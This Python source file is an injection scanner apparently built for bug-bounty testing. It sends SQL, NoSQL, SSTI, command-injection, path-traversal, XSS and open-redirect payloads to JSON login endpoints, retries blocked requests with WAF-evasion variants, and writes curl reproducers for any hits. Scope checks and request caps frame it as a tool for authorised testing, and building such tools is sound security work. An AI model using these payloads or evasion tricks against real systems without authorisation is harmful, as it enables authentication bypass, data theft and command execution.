#!/usr/bin/env python3
"""POST-JSON injection probe.

Closes the scanner gap where sqli/auth_bypass lanes only test GET ?param=
URLs and miss the modern attack surface of REST APIs with JSON bodies (e.g.
Juice Shop `/rest/user/login` SQLi via `email`: `' OR 1=1--`).

Workflow:
  1. Collect target endpoints (either via --endpoints-file or by reading
     js_intel hypotheses for POST patterns).
  2. For each endpoint with discovered JSON fields, send a baseline POST and
     a series of injection payloads (SQLi / SSTI / cmd-inj / open-redirect /
     auth-bypass) per string field.
  3. Three-stage detection:
       a. strong-signal: JWT-shaped token + admin role markers in response
          (only for auth endpoints with payloads designed to log in)
       b. SQL-error fingerprint + structural diff > 20%
       c. time delay > 4s when payload includes SLEEP(5)
  4. Write per-hit JSON + curl reproducer under findings/<t>/poc/json_inject/

Designed to be safe (read-only / login-style probes), bounded by request count
limits, fail-open on network errors.

CLI:
    python3 -m tools.json_inject_probe \
        --target localhost:3000 \
        --endpoints recon/localhost:3000/browser/xhr_endpoints.txt \
        [--js-intel findings/localhost:3000/js_intel/hypotheses.json] \
        [--max-requests 60]
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import tempfile
import time
import urllib.parse
import urllib.request
from pathlib import Path

TOOLS_DIR = Path(__file__).resolve().parent
BASE_DIR = TOOLS_DIR.parent

try:
    from tools.auth_session import AuthSession, add_cli_args, session_from_args
    from tools.browser_surface import public_url_shape
    from tools.target_paths import canonical_target_value, target_storage_key, url_belongs_to_target
    from tools.waf_encoder import base64_wrap_xss, tab_newline_space
    from tools.waf_response_analyzer import LogIDExtractor, ResponseFingerprint, WAFSignatureDB
except ImportError:  # pragma: no cover
    sys.path.insert(0, str(TOOLS_DIR))
    from auth_session import AuthSession, add_cli_args, session_from_args  # type: ignore
    from browser_surface import public_url_shape  # type: ignore
    from target_paths import canonical_target_value, target_storage_key, url_belongs_to_target  # type: ignore
    from waf_encoder import base64_wrap_xss, tab_newline_space  # type: ignore
    from waf_response_analyzer import LogIDExtractor, ResponseFingerprint, WAFSignatureDB  # type: ignore

USER_AGENT = "claude-bug-bounty/json_inject_probe"
MAX_WAF_RETRIES = 2
SUMMARY_SCHEMA_VERSION = 2
SUMMARY_ITEM_LIMIT = 100
_WAF_DB = WAFSignatureDB()
_WAF_LOG_IDS = LogIDExtractor(_WAF_DB)

# Payload library (one per attack class — kept tight on purpose).
PAYLOADS: list[dict] = [
    {"class": "sqli_auth_bypass", "value": "' OR 1=1--", "field_hint": "email|user|login|name|account"},
    {"class": "sqli_error", "value": "'", "field_hint": ".*"},
    {"class": "sqli_time", "value": "1' AND SLEEP(5)-- -", "field_hint": ".*", "expect": "time>=4"},
    {"class": "ssti", "value": "{{7*7}}", "field_hint": ".*"},
    {"class": "cmd_injection", "value": "127.0.0.1;id", "field_hint": "host|ip|target|server|url"},
    {"class": "open_redirect", "value": "https://evil.example.com", "field_hint": "url|redirect|return|next|to|callback"},
    {"class": "path_traversal", "value": "../../etc/passwd", "field_hint": "file|path|page|template|name"},
    {"class": "xss", "value": "<svg/onload=alert(1)>", "field_hint": ".*"},
    # NoSQL operator injection — sends a dict where the server expects a string.
    # Mongo/Mongoose treat {"$ne": null} as "not equal null" → matches any record.
    {"class": "nosql_op_injection", "value": {"$ne": None}, "field_hint": "password|pwd|secret|token|email|user|login"},
    # NoSQL regex bypass — wildcard regex matches every row for the field.
    {"class": "nosql_regex_bypass", "value": {"$regex": ".*"}, "field_hint": "email|user|login|name|account|username"},
    # GraphQL introspection probe — fires only on `query`-shaped fields. Many
    # GraphQL gateways accept POST {"query": "..."} on /graphql and leak the
    # full schema when introspection is left enabled in production.
    {"class": "graphql_introspection", "value": "{ __schema { types { name } } }", "field_hint": "query|gql|graphql"},
]

# Strong-signal regexes scanned in response bodies.
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
ADMIN_ROLE_RE = re.compile(r'"role"\s*:\s*"(admin|root|superuser)"', re.I)
SQL_ERROR_RE = re.compile(
    r"SQLITE_ERROR|SQL syntax|sqlite3\.|ORA-\d+|mysqli?_\w+|PG::\w+|near \"[^\"]*\": syntax error|"
    r"unterminated quoted string|Unclosed quotation mark",
    re.I,
)
SSTI_PROOF_RE = re.compile(r"\b49\b")
CMD_PROOF_RE = re.compile(r"uid=\d+\([^)]+\)|gid=\d+|groups=", re.I)
PATH_PROOF_RE = re.compile(r"root:[x*]:0:0:", re.I)
# GraphQL introspection success — both keys must appear together so we don't
# false-positive on a 404 page that happens to mention "__schema".
GRAPHQL_INTROSPECTION_RE = re.compile(r'"__schema"\s*:\s*\{|"types"\s*:\s*\[\s*\{\s*"name"', re.I)
# Class groups that share a detection signal.
AUTH_BYPASS_CLASSES = ("sqli_auth_bypass", "nosql_op_injection", "nosql_regex_bypass")


# ---------------------------------------------------------------------------
# Endpoint discovery


def _collect_endpoints(args: argparse.Namespace) -> tuple[list[dict], dict]:
    """Return accepted POST endpoints and bounded skip metadata."""
    endpoints: list[dict] = []
    seen: set[str] = set()
    skipped = {
        "out_of_scope": 0,
        "unsupported_method": 0,
        "invalid_url": 0,
        "items": [],
    }

    def reject(reason: str, url: object = "", method: object = "") -> None:
        skipped[reason] += 1
        if len(skipped["items"]) < 10:
            skipped["items"].append({
                "reason": reason,
                "method": str(method or "").upper(),
                "url": public_url_shape(str(url or "")),
            })

    def accept(url: object, method: object, body: object, source: str) -> None:
        raw_url = str(url or "").strip()
        method_name = str(method or "POST").strip().upper()
        parsed = urllib.parse.urlparse(raw_url)
        if not raw_url or parsed.scheme not in {"http", "https"} or not parsed.hostname:
            reject("invalid_url", raw_url, method_name)
            return
        if method_name != "POST":
            reject("unsupported_method", raw_url, method_name)
            return
        if not url_belongs_to_target(raw_url, args.target):
            reject("out_of_scope", raw_url, method_name)
            return
        template = body if isinstance(body, dict) else {}
        identity = json.dumps(
            [method_name, raw_url, template],
            sort_keys=True,
            separators=(",", ":"),
            ensure_ascii=False,
        )
        if identity in seen:
            return
        seen.add(identity)
        endpoints.append({
            "method": method_name,
            "url": raw_url,
            "body_template": template,
            "source": source,
        })

    if args.endpoints_file:
        ep_path = Path(args.endpoints_file).expanduser().resolve()
        if ep_path.is_file():
            for line in ep_path.read_text(encoding="utf-8", errors="replace").splitlines():
                line = line.strip()
                if not line:
                    continue
                # Accept either bare URL or JSON {"method":"POST","url":"..."}
                if line.startswith("{"):
                    try:
                        item = json.loads(line)
                    except (json.JSONDecodeError, TypeError):
                        reject("invalid_url")
                        continue
                    if not isinstance(item, dict):
                        reject("invalid_url")
                        continue
                    url = item.get("url")
                    method = item.get("method") or "POST"
                    body = item.get("body") or item.get("request_body") or {}
                else:
                    url = line
                    method = "POST"
                    body = {}
                accept(url, method, body, "endpoints_file")

    # Pull common login/auth POST endpoints from js_intel hypotheses as a default
    # set when nothing more concrete was supplied. We hand-curate the fields so
    # the probe does not blindly explode parameter combinations.
    if args.js_intel:
        ji_path = Path(args.js_intel).expanduser().resolve()
        if ji_path.is_file():
            try:
                ji = json.loads(ji_path.read_text(encoding="utf-8"))
            except Exception:
                ji = {}
            base = f"http://{args.target}" if "://" not in args.target else args.target.rstrip("/")
            for path, template in _login_seeds_from_js_intel(ji):
                url = base + path
                accept(url, "POST", template, "js_intel_seed")

    # Heuristic baseline seeds for any target — covers common REST login shapes.
    if not endpoints and args.add_default_seeds:
        base = f"http://{args.target}" if "://" not in args.target else args.target.rstrip("/")
        for path, template in DEFAULT_LOGIN_SEEDS:
            accept(base + path, "POST", template, "default_seed")

    return endpoints, skipped


DEFAULT_LOGIN_SEEDS: list[tuple[str, dict]] = [
    ("/rest/user/login", {"email": "test@test", "password": "x"}),
    ("/api/login", {"username": "test", "password": "x"}),
    ("/api/auth/login", {"username": "test", "password": "x"}),
    ("/login", {"username": "test", "password": "x"}),
    ("/auth/login", {"email": "test@test", "password": "x"}),
]


def _login_seeds_from_js_intel(ji: dict) -> list[tuple[str, dict]]:
    """Pull plausible login endpoints from js_intel and pair with a template body."""
    seeds: list[tuple[str, dict]] = []
    rest = ji.get("endpoints", {}).get("rest_custom", []) if isinstance(ji, dict) else []
    rest_api = ji.get("endpoints", {}).get("rest_api_crud", []) if isinstance(ji, dict) else []
    pool = list(rest) + list(rest_api)
    for ep in pool:
        if not isinstance(ep, str):
            continue
        lower = ep.lower()
        if "login" in lower or "auth" in lower or "signin" in lower:
            seeds.append((ep, {"email": "test@test", "password": "x"}))
        elif "register" in lower or "signup" in lower:
            seeds.append((ep, {"email": "test@test", "password": "x", "username": "tester"}))
    return seeds


# ---------------------------------------------------------------------------
# HTTP plumbing


class OutOfScopeRedirect(ValueError):
    """Raised before urllib follows a redirect outside the active target."""


class _ScopedRedirectHandler(urllib.request.HTTPRedirectHandler):
    def __init__(self, target: str, session: AuthSession | None = None):
        self.target = target
        self.session = session

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[no-untyped-def]
        if not url_belongs_to_target(newurl, self.target):
            raise OutOfScopeRedirect(public_url_shape(newurl))
        redirected = super().redirect_request(req, fp, code, msg, headers, newurl)
        if redirected is not None and self.session is not None and not self.session.allows_url(newurl):
            for name in self.session.sensitive_header_names():
                redirected.remove_header(name)
                redirected.remove_unredirected_header(name)
        return redirected


def _http_post_json(
    url: str,
    body: dict,
    timeout: float = 10.0,
    *,
    target: str = "",
    session: AuthSession | None = None,
) -> dict:
    """Return status, body, headers, latency, and any transport error."""
    if target and not url_belongs_to_target(url, target):
        return {
            "status": 0,
            "body_text": "",
            "body_size": 0,
            "headers": "",
            "latency": 0.0,
            "error": f"OutOfScopeURL:{public_url_shape(url)}",
        }
    data = json.dumps(body).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "Accept": "application/json,text/html;q=0.9,*/*;q=0.1",
            **(session.headers_for_url(url) if session is not None else {}),
        },
        method="POST",
    )
    t0 = time.time()
    try:
        opener = urllib.request.build_opener(_ScopedRedirectHandler(target or url, session))
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read(64 * 1024)
            return {
                "status": resp.status,
                "body_text": raw.decode("utf-8", errors="replace"),
                "body_size": len(raw),
                "headers": "\n".join(f"{key}: {value}" for key, value in resp.headers.items()),
                "latency": time.time() - t0,
                "error": None,
            }
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(64 * 1024)
        except Exception:
            raw = b""
        return {
            "status": e.code,
            "body_text": raw.decode("utf-8", errors="replace"),
            "body_size": len(raw),
            "headers": "\n".join(f"{key}: {value}" for key, value in (e.headers or {}).items()),
            "latency": time.time() - t0,
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "body_text": "",
            "body_size": 0,
            "headers": "",
            "latency": time.time() - t0,
            "error": f"{type(exc).__name__}:{exc}",
        }


def _curl_reproducer(url: str, body: dict) -> str:
    body_str = json.dumps(body).replace("'", "'\\''")
    return f"curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{body_str}'"


def _response_fingerprint(response: dict) -> ResponseFingerprint:
    body = str(response.get("body_text") or "")
    return ResponseFingerprint.build(
        body,
        str(response.get("headers") or ""),
        status_code=int(response.get("status") or 0),
        body_length=int(response.get("body_size") or len(body.encode("utf-8"))),
        response_time_ms=float(response.get("latency") or 0.0) * 1000.0,
        db=_WAF_DB,
        extractor=_WAF_LOG_IDS,
    )


def _waf_observation(baseline: dict, response: dict) -> dict:
    """Classify only new block signals relative to the endpoint baseline."""
    if baseline.get("error") or int(baseline.get("status") or 0) <= 0:
        return {
            "blocked": False,
            "vendor": None,
            "signals": [],
            "status": int(response.get("status") or 0),
            "outcome": "baseline_unavailable",
        }
    if response.get("error") or int(response.get("status") or 0) <= 0:
        return {
            "blocked": False,
            "vendor": None,
            "signals": [],
            "status": int(response.get("status") or 0),
            "outcome": "transport_error",
        }
    base = _response_fingerprint(baseline)
    probe = _response_fingerprint(response)
    base_body_vendors = set(_WAF_DB.match_vendors(str(baseline.get("body_text") or ""), ""))
    probe_body_vendors = set(_WAF_DB.match_vendors(str(response.get("body_text") or ""), ""))
    base_header_vendors = set(_WAF_DB.match_vendors("", str(baseline.get("headers") or "")))
    probe_header_vendors = set(_WAF_DB.match_vendors("", str(response.get("headers") or "")))

    signals: list[str] = []
    if probe_body_vendors - base_body_vendors:
        signals.append("new_vendor_body")
    if probe_header_vendors - base_header_vendors:
        signals.append("new_vendor_header")
    if probe.has_block_title and not base.has_block_title:
        signals.append("block_title")
    if probe.has_challenge_signal and not base.has_challenge_signal:
        signals.append("challenge")
    if int(response.get("status") or 0) in {403, 406} and int(baseline.get("status") or 0) not in {403, 406}:
        signals.append("block_status_delta")

    vendors = sorted((probe_body_vendors | probe_header_vendors) - (base_body_vendors | base_header_vendors))
    if not vendors:
        vendors = probe.vendor_hits
    outcome = "waf_blocked" if signals else "application_response"
    if not signals and probe.status_code == 429:
        outcome = "rate_limited"
    return {
        "blocked": bool(signals),
        "vendor": vendors[0] if vendors else None,
        "signals": signals,
        "status": probe.status_code,
        "outcome": outcome,
    }


def _waf_variants(payload_class: str, payload_value: object) -> list[tuple[str, str]]:
    """Return a bounded set of semantic variants only for supported strings."""
    if not isinstance(payload_value, str):
        return []
    if payload_class.startswith("sqli_"):
        candidates = dict(tab_newline_space(payload_value))
        techniques = ("space-to-/**/-comment", "space-to-tab")
    elif payload_class == "xss":
        candidates = dict(base64_wrap_xss(payload_value))
        techniques = ("xss-base64-svg-onload", "xss-base64-img-onerror")
    else:
        return []
    return [
        (name, candidates[name])
        for name in techniques
        if name in candidates and candidates[name] != payload_value
    ][:MAX_WAF_RETRIES]


# ---------------------------------------------------------------------------
# Probe logic


def _detect_hit(payload_class: str, baseline: dict, response: dict, payload_value: str) -> dict:
    """Return {hit: bool, signal: str, evidence: str}."""
    out = {"hit": False, "signal": "", "evidence": ""}
    if (
        baseline.get("error")
        or response.get("error")
        or int(baseline.get("status") or 0) <= 0
        or int(response.get("status") or 0) <= 0
    ):
        return out
    body = response.get("body_text", "")
    base_body = baseline.get("body_text", "")

    # Strong signal A: JWT + admin role appeared (login bypass via SQLi or NoSQL operator/regex)
    jwt = JWT_RE.search(body)
    role = ADMIN_ROLE_RE.search(body) or ADMIN_ROLE_RE.search(_decode_jwt_payload(jwt.group(0)) if jwt else "")
    if jwt and payload_class in AUTH_BYPASS_CLASSES:
        out["hit"] = True
        if payload_class == "sqli_auth_bypass":
            out["signal"] = "auth_bypass_jwt_returned"
        else:
            out["signal"] = f"{payload_class}_jwt_returned"
        out["evidence"] = f"jwt_prefix={jwt.group(0)[:40]}...; role_match={'yes' if role else 'unknown'}"
        return out

    # Strong signal B: SQL error fingerprint
    if payload_class in ("sqli_error", "sqli_auth_bypass") and SQL_ERROR_RE.search(body):
        out["hit"] = True
        out["signal"] = "sql_error_fingerprint"
        out["evidence"] = SQL_ERROR_RE.search(body).group(0)[:120]
        return out

    # Strong signal C: time-based blind SQLi
    if payload_class == "sqli_time" and response.get("latency", 0) >= 4.0 and baseline.get("latency", 0) < 2.0:
        out["hit"] = True
        out["signal"] = "sqli_time_delay"
        out["evidence"] = f"baseline={baseline['latency']:.2f}s probe={response['latency']:.2f}s"
        return out

    # Strong signal D: SSTI execution (7*7=49)
    if payload_class == "ssti" and SSTI_PROOF_RE.search(body) and not SSTI_PROOF_RE.search(base_body):
        out["hit"] = True
        out["signal"] = "ssti_evaluation"
        out["evidence"] = "response contains 49 (7*7) where baseline did not"
        return out

    # Strong signal E: command injection
    if payload_class == "cmd_injection" and CMD_PROOF_RE.search(body):
        out["hit"] = True
        out["signal"] = "cmd_injection_uid_disclosure"
        out["evidence"] = CMD_PROOF_RE.search(body).group(0)
        return out

    # Strong signal F: path traversal hit
    if payload_class == "path_traversal" and PATH_PROOF_RE.search(body):
        out["hit"] = True
        out["signal"] = "path_traversal_etc_passwd"
        out["evidence"] = "/etc/passwd content detected in response"
        return out

    # Strong signal G: XSS reflection of payload verbatim
    if (
        payload_class == "xss"
        and isinstance(payload_value, str)
        and payload_value in body
        and payload_value not in base_body
    ):
        out["hit"] = True
        out["signal"] = "xss_reflection"
        out["evidence"] = "payload reflected verbatim"
        return out

    # Strong signal H: open redirect (302/3xx with Location matching payload)
    # (urllib follows redirects; this is best-effort via body / status only.)
    if payload_class == "open_redirect" and response.get("status") in (301, 302, 303, 307, 308):
        if payload_value in body or "evil.example.com" in body:
            out["hit"] = True
            out["signal"] = "open_redirect_external_location"
            out["evidence"] = f"3xx with payload echoed (status={response['status']})"
            return out

    # Strong signal I: GraphQL introspection enabled. The schema leak is itself
    # a Medium finding (priv-esc playbook + hidden mutation discovery), so we
    # require the baseline to NOT contain the introspection markers to avoid
    # false-positives on GraphQL playgrounds that 200/echo on any request.
    if payload_class == "graphql_introspection":
        if GRAPHQL_INTROSPECTION_RE.search(body) and not GRAPHQL_INTROSPECTION_RE.search(base_body):
            out["hit"] = True
            out["signal"] = "graphql_introspection_enabled"
            match = GRAPHQL_INTROSPECTION_RE.search(body)
            out["evidence"] = f"introspection marker present: {match.group(0)[:80]}"
            return out

    return out


def _decode_jwt_payload(jwt: str) -> str:
    try:
        parts = jwt.split(".")
        if len(parts) < 2:
            return ""
        import base64
        seg = parts[1] + "=" * (-len(parts[1]) % 4)
        return base64.urlsafe_b64decode(seg).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _field_eligible(field: str, payload: dict) -> bool:
    hint = payload.get("field_hint") or ".*"
    return bool(re.search(hint, field, re.I))


def _send_json(
    url: str,
    body: dict,
    timeout: float,
    *,
    target: str,
    session: AuthSession | None,
) -> dict:
    if target or session is not None:
        return _http_post_json(url, body, timeout, target=target, session=session)
    return _http_post_json(url, body, timeout)


def _record_request(stats: dict | None, response: dict) -> None:
    if stats is None:
        return
    stats["request_count"] = int(stats.get("request_count", 0) or 0) + 1
    error = str(response.get("error") or "")
    if error:
        stats["transport_error_count"] = int(stats.get("transport_error_count", 0) or 0) + 1
    if error.startswith("OutOfScopeRedirect:"):
        stats["out_of_scope_redirect"] = int(stats.get("out_of_scope_redirect", 0) or 0) + 1


def probe_endpoint(
    endpoint: dict,
    max_requests: int,
    *,
    target: str = "",
    session: AuthSession | None = None,
    stats: dict | None = None,
) -> tuple[list[dict], list[dict]]:
    url = endpoint["url"]
    body_template = endpoint.get("body_template") or {}
    if not isinstance(body_template, dict) or not body_template:
        return [], []

    # baseline call
    baseline = _send_json(url, body_template, 10.0, target=target, session=session)
    _record_request(stats, baseline)
    request_count = 1
    hits: list[dict] = []
    waf_events: list[dict] = []
    if baseline.get("error") or int(baseline.get("status") or 0) <= 0:
        return hits, waf_events

    string_fields = [k for k, v in body_template.items() if isinstance(v, (str, int)) or v is None]
    for payload in PAYLOADS:
        for field in string_fields:
            if not _field_eligible(field, payload):
                continue
            if request_count >= max_requests:
                return hits, waf_events
            mutated = dict(body_template)
            mutated[field] = payload["value"]
            resp = _send_json(
                url,
                mutated,
                12.0 if payload["class"] == "sqli_time" else 8.0,
                target=target,
                session=session,
            )
            _record_request(stats, resp)
            request_count += 1
            waf = _waf_observation(baseline, resp)
            if waf["outcome"] == "application_response":
                detection = _detect_hit(payload["class"], baseline, resp, payload["value"])
                if detection["hit"]:
                    hits.append({
                        "url": url,
                        "method": "POST",
                        "field": field,
                        "payload_class": payload["class"],
                        "payload_value": payload["value"],
                        "signal": detection["signal"],
                        "evidence": detection["evidence"],
                        "response_status": resp["status"],
                        "response_size": resp["body_size"],
                        "response_excerpt": resp["body_text"][:280],
                        "curl": _curl_reproducer(url, mutated),
                    })
                continue
            if not waf["blocked"]:
                continue
            waf_events.append({
                "url": url,
                "field": field,
                "payload_class": payload["class"],
                "technique": "canonical",
                **waf,
            })
            for technique, variant in _waf_variants(payload["class"], payload["value"]):
                if request_count >= max_requests:
                    return hits, waf_events
                mutated = dict(body_template)
                mutated[field] = variant
                retry = _send_json(
                    url,
                    mutated,
                    12.0 if payload["class"] == "sqli_time" else 8.0,
                    target=target,
                    session=session,
                )
                _record_request(stats, retry)
                request_count += 1
                retry_waf = _waf_observation(baseline, retry)
                waf_events.append({
                    "url": url,
                    "field": field,
                    "payload_class": payload["class"],
                    "technique": technique,
                    **retry_waf,
                })
                if retry_waf["outcome"] in {"transport_error", "rate_limited"}:
                    break
                if retry_waf["blocked"]:
                    continue
                detection = _detect_hit(payload["class"], baseline, retry, variant)
                if detection["hit"]:
                    hits.append({
                        "url": url,
                        "method": "POST",
                        "field": field,
                        "payload_class": payload["class"],
                        "payload_value": variant,
                        "waf_variant": technique,
                        "signal": detection["signal"],
                        "evidence": detection["evidence"],
                        "response_status": retry["status"],
                        "response_size": retry["body_size"],
                        "response_excerpt": retry["body_text"][:280],
                        "curl": _curl_reproducer(url, mutated),
                    })
                    break
                break
    return hits, waf_events


# ---------------------------------------------------------------------------
# Output writer


def _source_binding(path_value: str) -> dict:
    if not path_value:
        return {}
    path = Path(path_value).expanduser().resolve()
    if not path.is_file():
        return {}
    try:
        display = str(path.relative_to(BASE_DIR))
    except ValueError:
        display = str(path)
    return {
        "path": display,
        "sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
        "size": path.stat().st_size,
    }


def _input_fingerprint(endpoints: list[dict], source_bindings: list[dict]) -> str:
    canonical = {
        "endpoints": [
            {
                "method": str(item.get("method") or "POST"),
                "url": str(item.get("url") or ""),
                "body": item.get("body_template") if isinstance(item.get("body_template"), dict) else {},
            }
            for item in endpoints
        ],
        "sources": source_bindings,
    }
    encoded = json.dumps(canonical, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
    return hashlib.sha256(encoded.encode("utf-8")).hexdigest()


def _write_json_atomic(path: Path, payload: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    temp_path: Path | None = None
    try:
        with tempfile.NamedTemporaryFile(
            "w",
            encoding="utf-8",
            dir=str(path.parent),
            prefix=f".{path.name}.",
            suffix=".tmp",
            delete=False,
        ) as handle:
            temp_path = Path(handle.name)
            handle.write(json.dumps(payload, ensure_ascii=False, indent=2) + "\n")
            handle.flush()
            os.fsync(handle.fileno())
        temp_path.replace(path)
    except Exception:
        if temp_path is not None:
            try:
                temp_path.unlink()
            except FileNotFoundError:
                pass
        raise


def _write_findings(
    target: str,
    hits: list[dict],
    waf_events: list[dict],
    *,
    execution: dict | None = None,
) -> dict:
    target_key = target_storage_key(target)
    out_dir = BASE_DIR / "findings" / target_key / "poc" / "json_inject"
    out_dir.mkdir(parents=True, exist_ok=True)
    for stale in out_dir.glob("*.json"):
        if stale.name != "summary.json":
            stale.unlink()
    written: list[str] = []
    for hit in hits:
        slug_url = re.sub(r"[^A-Za-z0-9._-]+", "_", urllib.parse.urlparse(hit["url"]).path).strip("_") or "root"
        fname = f"{hit['payload_class']}_{slug_url}_{hit['field']}.json"
        path = out_dir / fname
        path.write_text(json.dumps(hit, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        written.append(str(path))
    summary_path = out_dir / "summary.json"
    details = dict(execution or {})
    status = str(details.pop("status", "") or "")
    transport_errors = int(details.get("transport_error_count", 0) or 0)
    redirect_skips = int((details.get("skipped") or {}).get("out_of_scope_redirect", 0) or 0)
    if not status:
        status = "candidate_pending" if hits else (
            "partial" if transport_errors or redirect_skips else "complete_no_hit"
        )
    summary = {
        "schema_version": SUMMARY_SCHEMA_VERSION,
        "kind": "json_inject_summary",
        "target": canonical_target_value(target),
        "status": status,
        **details,
        "hit_count": len(hits),
        "waf_observation_count": len(waf_events),
        "generated_at": int(time.time()),
        "hits": [
            {
                "url": h["url"],
                "field": h["field"],
                "class": h["payload_class"],
                "signal": h["signal"],
            }
            for h in hits[:SUMMARY_ITEM_LIMIT]
        ],
        "waf_observations": waf_events[:SUMMARY_ITEM_LIMIT],
    }
    _write_json_atomic(summary_path, summary)
    return {"out_dir": str(out_dir), "summary": str(summary_path), "files": written}


# ---------------------------------------------------------------------------
# CLI


def main() -> int:
    parser = argparse.ArgumentParser(description="POST-JSON injection probe — covers REST-API JSON-body attack surface")
    parser.add_argument("--target", required=True, help="Target host or host:port (used for storage path + default seeds)")
    parser.add_argument("--endpoints-file", default="", help="File with one URL per line OR JSONL of {method,url,body}")
    parser.add_argument("--js-intel", default="", help="Path to findings/<t>/js_intel/hypotheses.json for endpoint seeds")
    seed_group = parser.add_mutually_exclusive_group()
    seed_group.add_argument("--add-default-seeds", dest="add_default_seeds", action="store_true",
                            default=True, help="When no other source provides endpoints, probe common login paths")
    seed_group.add_argument("--no-default-seeds", dest="add_default_seeds", action="store_false",
                            help="Probe only endpoints supplied by explicit or discovered inputs")
    parser.add_argument("--max-requests", type=int, default=60, help="Hard cap on total probe requests per endpoint")
    add_cli_args(parser)
    args = parser.parse_args()
    args.target = canonical_target_value(args.target)
    session = session_from_args(args).bind_target(args.target)

    endpoints, skipped = _collect_endpoints(args)
    source_bindings = [
        binding
        for binding in (
            _source_binding(args.endpoints_file),
            _source_binding(args.js_intel),
        )
        if binding
    ]
    input_fingerprint = _input_fingerprint(endpoints, source_bindings)
    if not endpoints:
        print(
            "[json_inject] no eligible POST endpoints to probe "
            f"(out_of_scope={skipped['out_of_scope']} "
            f"unsupported_method={skipped['unsupported_method']} invalid_url={skipped['invalid_url']})",
            file=sys.stderr,
        )
        if source_bindings or any(int(skipped[key]) for key in ("out_of_scope", "unsupported_method", "invalid_url")):
            _write_findings(
                args.target,
                [],
                [],
                execution={
                    "status": "invalid_input",
                    "input_fingerprint": input_fingerprint,
                    "source_bindings": source_bindings,
                    "endpoint_count": 0,
                    "probed_endpoint_count": 0,
                    "request_count": 0,
                    "transport_error_count": 0,
                    "skipped": {**skipped, "out_of_scope_redirect": 0},
                    "auth_applied": False,
                    "auth_session_id": session.session_id(),
                },
            )
        return 1

    print(f"[json_inject] probing {len(endpoints)} endpoint(s) for target={args.target}", file=sys.stderr)
    all_hits: list[dict] = []
    all_waf_events: list[dict] = []
    execution_stats = {
        "request_count": 0,
        "transport_error_count": 0,
        "out_of_scope_redirect": 0,
    }
    probed_endpoint_count = 0
    for ep in endpoints:
        print(f"[json_inject]  -> {ep['method']} {ep['url']} (source={ep.get('source')})", file=sys.stderr)
        hits, waf_events = probe_endpoint(
            ep,
            max_requests=args.max_requests,
            target=args.target,
            session=session,
            stats=execution_stats,
        )
        probed_endpoint_count += 1
        all_waf_events.extend(waf_events)
        if hits:
            print(f"[json_inject]     {len(hits)} hit(s)", file=sys.stderr)
            all_hits.extend(hits)

    skipped["out_of_scope_redirect"] = execution_stats["out_of_scope_redirect"]
    result = _write_findings(
        args.target,
        all_hits,
        all_waf_events,
        execution={
            "input_fingerprint": input_fingerprint,
            "source_bindings": source_bindings,
            "endpoint_count": len(endpoints),
            "probed_endpoint_count": probed_endpoint_count,
            "request_count": execution_stats["request_count"],
            "transport_error_count": execution_stats["transport_error_count"],
            "skipped": skipped,
            "auth_applied": bool(
                not session.is_empty()
                and any(session.headers_for_url(str(item.get("url") or "")) for item in endpoints)
            ),
            "auth_session_id": session.session_id(),
        },
    )
    if not all_hits:
        if all_waf_events:
            print(
                f"[json_inject] no injection hits; preserved {len(all_waf_events)} WAF observations",
                file=sys.stderr,
            )
        else:
            print("[json_inject] no injection hits — check endpoint shapes / try --js-intel for richer surface", file=sys.stderr)
        print(json.dumps({"status": "no_hits", "hit_count": 0, **result}, indent=2))
        return 0

    print(json.dumps({"status": "ok", "hit_count": len(all_hits), **result}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
